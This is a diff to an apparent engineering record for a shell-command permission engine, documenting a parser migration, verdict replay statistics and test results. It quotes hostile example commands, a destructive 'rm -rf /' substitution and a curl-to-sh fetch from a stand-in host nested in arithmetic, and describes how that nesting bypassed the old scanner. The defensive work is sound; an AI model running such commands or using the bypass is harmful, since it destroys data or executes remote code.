@@ -45,8 +45,8 @@ Every construct ADR 0039 and bead `pg2-jxmk9` name, and whether it is covered or
 
 | Item                                                  | Why deferred                                                                                                                                                                                                                                                                           |
 | ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Flipping the engine to the candidate                  | This step is shadow-only by construction. The flip is `pg2-zeqa5`/`pg2-fez3d`.                                                                                                                                                                                                         |
-| The substitution-scan family (`ScanSubstitutions`)    | ADR 0039's Consequences calls this a third front end whose local "unparseable" notion has no AST analogue. Migrating it changes verdicts and owes its own enumeration, so it is not done under a no-behaviour-change step.                                                             |
+| Flipping the engine to the candidate                  | This step is shadow-only by construction. The flip is `pg2-fez3d`.                                                                                                                                                                                                                     |
+| The substitution-scan family (`ScanSubstitutions`)    | **DONE — step 2a, `pg2-zeqa5`. See "Step 2a" below.**                                                                                                                                                                                                                                  |
 | Enforcement guard 3 (parse-count, I7)                 | ADR 0039's Enforcement states it MUST land AFTER the per-rule `gitdir` migration, because `gitdir` re-parses the root expression and recurses to depth 8, so the guard cannot go green before that.                                                                                    |
 | Enforcement guard 2 (raw-text-structure, I9)          | ADR 0039 carries the mechanism as an OPEN question and assigns the decision to the per-rule migration step, which must record which mechanism it chose and why.                                                                                                                        |
 | Enforcement guard 4 (coverage check, I14)             | Partially discharged: the leaf-delta accounting in `frontend_ab_test.go` runs over the whole snapshot and did catch a real dropped-leaf defect. The full span-union assertion against every `*syntax.CallExpr` is a separate check and belongs with the flip, which owns the leaf set. |
@@ -214,3 +214,149 @@ Reading of the table:
 - **151 rows (0.08% of the snapshot, 0.19% of the delta) remain unattributed** and are dumped
   verbatim with both leaf sets. They are not annotated, blanket or otherwise; the flip step must
   read them.
+
+---
+
+# Step 2a — the substitution-scan family, migrated (`pg2-zeqa5`)
+
+Authority: ADR 0039's Decision, Invariants (I1a, I1b, I6, I7, I8) and Enforcement. Base
+`b62f02bb`. This section is the record ADR 0039's Enforcement item "Differential replay" requires
+of every migration step.
+
+## What moved
+
+| Symbol                           | Outcome     | Where it went                                                                                                                             |
+| -------------------------------- | ----------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
+| `scanSubstitutions`              | **deleted** | The shared `quotesAreSyntax` byte loop. Replaced by two parser ENTRY POINTS, so the two expansion models can no longer drift.              |
+| `indexUnescapedBacktick`         | **deleted** | An inventory instance in its OWN right: not quote-aware AT ALL by its own comment, and its caller `IsSafeSubstitutionBody` is on the `pg2-wguam` P0 path. |
+| `matchParen`                     | **shimmed** | Kept VERBATIM in `parser.go` for `classifyCmdSubstitution` / `classifyBacktickSubstitution` only. Owned by `pg2-x9452` (step 5).           |
+| `ScanSubstitutions`              | migrated    | `shellparse.go`, `syntax.Parser.Parse` + a top-level AST walk.                                                                             |
+| `ScanSubstitutionsInHeredocBody` | migrated    | `shellparse.go`, `syntax.Parser.Document` — the parser's OWN here-document model.                                                          |
+| `EnumerateSubstitutions`         | migrated    | Unchanged facade over `ScanSubstitutions`.                                                                                                 |
+| `IsSafeSubstitutionBody`         | migrated    | One parse via `soleSimpleCommandLeaf`, replacing `ScanSubstitutions`-then-`Parse`.                                                         |
+
+Rule-side callers reach the seam unchanged (`gitdir.go` ×2, `envvars.go`, and `ssh.go`, which the
+bead's caller list omitted). Engine-side `IsSafeSubstitutionBody` inside `foldSubstitutionScan` is
+migrated with it.
+
+**Three THIN SHIMS remain, named so their owners can assert removal:** `matchParen` (step 5,
+`pg2-x9452`), and the two engine TEXT hops `evaluateHeredocBodies` and `evaluateSubstitutionsIn`
+(step 4, `pg2-1019a`). Steps 4 and 5 are NOT absorbed.
+
+## I1a is preserved as a FOLD
+
+`foldSubstitutionScan` and `unparseableSubstitutionFloor` are **byte-identical** to `b62f02bb`
+(md5 of code lines with comments stripped). `Unparseable` still folds through `MostRestrictive`,
+never an early return, so the verdict stays order-independent.
+
+## The forced semantic change, and why it did NOT materialise as a forfeiture
+
+ADR 0039 anticipates that the local per-scan unparseable signal has no AST analogue and collapses
+into I1b, forfeiting a sibling `Reject`. **In this step it does not**, because the fold is retained
+AND the prefix is retained. A strict parse yields no tree, so the naive migration would return zero
+bodies where the byte loop returned the prefix it had already found. Instead a FAILING text is
+re-parsed with `syntax.RecoverErrors` purely to salvage that prefix, and any substitution whose
+closer reports `Pos.IsRecovered` is dropped because its extent is unknown — the `pg2-wguam` rule in
+AST terms. `Unparseable` stays set regardless, so recovery never becomes the fallback parser I8
+forbids.
+
+The shape that makes this load-bearing is the engine's own heredoc-bearing leaf `Raw`, which is
+post-heredoc-strip and therefore ends at an unclosed here-document: `cmd $(rm -rf /) <<EOF` does not
+parse, yet the command-line `$( )` is real and must still be recursed. Pinned by
+`TestScanSubstitutions_UnparseableStillEnumeratesItsPrefix`.
+
+Cost: the failure path parses twice. Only 63 of 185,188 rows fail to parse (0.034%), and I7's
+parse-count guard is deferred to after the `gitdir` migration, which owns that accounting.
+
+## Verdict replay
+
+Corpus population per this file's "Corpus population" section; re-measured on a `VACUUM INTO`
+snapshot taken 2026-08-12 read-only via `immutable=1`: 338,424 rows, 218,567 non-excluded `Bash`,
+185,657 distinct `.command` values (the recorded 185,185 has grown).
+
+**Replayed:** 130,511 distinct `(command, cwd)` pairs, offline through `setup.NewEngineForCWD` +
+`EvaluateHook` with a redirected `XDG_DATA_HOME`. `cmd_evaluate` was NOT used.
+
+**Skipped and NOT presented as the whole:** 73,789 of 218,567 non-excluded `Bash` rows (**33.76%**,
+915 of 1,138 distinct `cwd` values) name a working directory that no longer exists.
+
+| base -> new         | rows   | direction            |
+| ------------------- | ------ | -------------------- |
+| approve -> approve  | 94,896 | same                 |
+| abstain -> abstain  | 32,722 | same                 |
+| ask -> ask          | 2,455  | same                 |
+| reject -> reject    | 413    | same                 |
+| approve -> abstain  | 23     | more restrictive     |
+| abstain -> ask      | 1      | more restrictive     |
+| reject -> ask       | 1      | **LESS restrictive** |
+
+**GATE: PASS.** 25 transitions on 130,511 rows. Exactly ONE moves in the less-restrictive direction
+under `Approve < Abstain < Ask < Reject`, and it is justified individually below. No transition
+reaches `Approve` from anything.
+
+### The one less-restrictive transition, justified individually
+
+`cd /Users/phillipg/phillipg_mbp && bd update pg2-ia640.5 --acceptance "$(cat <<'EOF' … EOF)" …`
+— base `Reject` (`primary-commit`), new `Ask` (`secrets`).
+
+The base verdict was a **mis-parse, not a judgement**. Measured on the base tree,
+`ScanSubstitutions` of that leaf's `Raw` returned **19** substitutions; **17 of them were markdown
+backtick CODE SPANS in documentation prose** inside a `<<'EOF'` heredoc — a QUOTED delimiter, so
+bash expands none of it. `indexUnescapedBacktick` is not quote-aware and knows nothing about heredoc
+extents, so each `` `…` `` in the prose became a backtick command substitution. One of them,
+`` `git commit -m "documented secrets/prod.yaml handling"` ``, was then parsed into a real
+`git commit` leaf, recursed through the rule chain in a canonical clone on `main`, and rejected by
+`primary-commit`. The base also truncated the one REAL substitution body by 1,703 bytes, because
+`matchParen` found the wrong closing paren.
+
+Over the seam the same text yields exactly **2** substitutions — the two real
+`$(cat <<'EOF' … EOF)` — with correct extents and no phantom commands. The new `Ask` comes from
+`secrets` reading the genuine prose. This is precisely ADR 0039's Enforcement item 5 permitted
+exception (a step whose purpose is to stop the parser breaking benign commands), it is one row
+justified on its own evidence rather than by blanket annotation, and it still PROMPTS — it does not
+approve.
+
+### The 24 more-restrictive transitions, by mechanical cause
+
+| Cause                                                                            | Rows |
+| -------------------------------------------------------------------------------- | ---- |
+| **A** — the unparseable-substitution floor now fires where the byte loop walked past a desync | 17   |
+| **B** — a command substitution nested in arithmetic `$(( ))` is now enumerated at all         | 6    |
+| **C** — `env-vars` classifies one assignment value as unsafe (`abstain -> ask`)               | 1    |
+
+**Cause A** is I1a working as designed on inputs the byte loop silently accepted. 11 rows are
+`diff <(…) <(…)` whose leaf `Raw` is a FRAGMENT the outgoing `splitCompound` cut inside a `<(`
+(a defect this file already records); the byte loop's `<(` arm did `i++ // malformed <(` and reported
+no desync, so a truncated fragment was certified as containing no substitutions. 2 rows are the same
+family with the opening paren cut off, 3 are fragments that are not valid bash (`invalid parameter
+name`), and 1 is an unmatched `<(` in a `for` body. All now prompt instead of auto-approving text
+nobody modelled.
+
+**Cause B closed a live auto-approve hole in the deployed binary.** The byte loop special-cased
+arithmetic by LOOKAHEAD — on `$(` followed by `(` it jumped the index past the whole matched extent —
+so it never looked inside, and a command substitution nested in arithmetic was enumerated NOWHERE.
+Measured on the base tree: `echo $(( $(curl -s http://evil.example/x | sh) + 1 ))` returned **zero**
+substitutions. bash performs the command substitution first and then the arithmetic, so it really
+runs. Pinned by `TestScanSubstitutions_NestedInArithmeticIsEnumerated`.
+
+## Tests
+
+No expectation was edited. `substitution_test.go` is **+0 deletions**; every deletion in
+`fuzz_test.go` and `engine.go` is a comment line. All 15 rows of
+`TestScanSubstitutions_Unparseable`, all 8 of `TestScanSubstitutionsInHeredocBody_QuotesAreData` and
+all of `TestIsSafeSubstitutionBody_NestedRejected` — the `pg2-wguam` regression set — pass
+UNCHANGED.
+
+`IsSafeSubstitutionBody` is deliberately TIGHTENED: its outgoing shape test was "`Parse` yields
+exactly one leaf", whose quote-awareness was a side effect of `splitCompound` splitting top-level
+operators. A real grammar makes that count admit `(cat VERSION)`, `{ cat VERSION; }` and
+`if true; then cat VERSION; fi`, so a count-only test would newly CLEAR compound bodies. The sole
+statement must now BE a `*syntax.CallExpr`. REDIRECTIONS are deliberately still judged on the
+LOWERED leaf, not on `Stmt.Redirs`, because `attachRedir` drops fd duplication — rejecting on
+`Stmt.Redirs` measured 5 rows of gratuitous `Approve -> Abstain` on `$(git rev-parse HEAD 2>&1)`.
+
+**Fuzz replacement** (Enforcement item "Fuzz continuity"): `FuzzEnumerateSubstitutions` states its
+replacement invariant in writing — the six properties the deleted harness asserted, plus three the
+seam newly makes falsifiable (bodies strictly shorter than their source, so the engine's recursion
+terminates; no parser-pool contamination between `Parse` and `Document`; recovery never clearing a
+desync). 1.9M executions clean.
